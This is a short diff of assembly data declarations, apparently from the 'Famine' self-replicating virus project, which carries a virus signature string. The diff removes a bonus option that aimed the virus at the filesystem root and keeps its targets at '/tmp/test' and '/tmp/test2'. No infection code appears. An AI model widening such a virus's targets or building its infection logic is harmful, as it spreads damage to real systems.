@@ -135,11 +135,7 @@ proc_test:
   .string db "Name:	test", 10
 	.len equ $ - proc_test.string
 
-%ifdef BONUS_MODE
-firstDir:       db "/", 0
-%else
 firstDir:       db "/tmp/test", 0
-%endif
 secondDir:      db "/tmp/test2", 0
 signature:      db "Famine version 1.0 (c)oded by - <ocrossi>-<elaignel> - "
 signature_len:  equ $ - signature
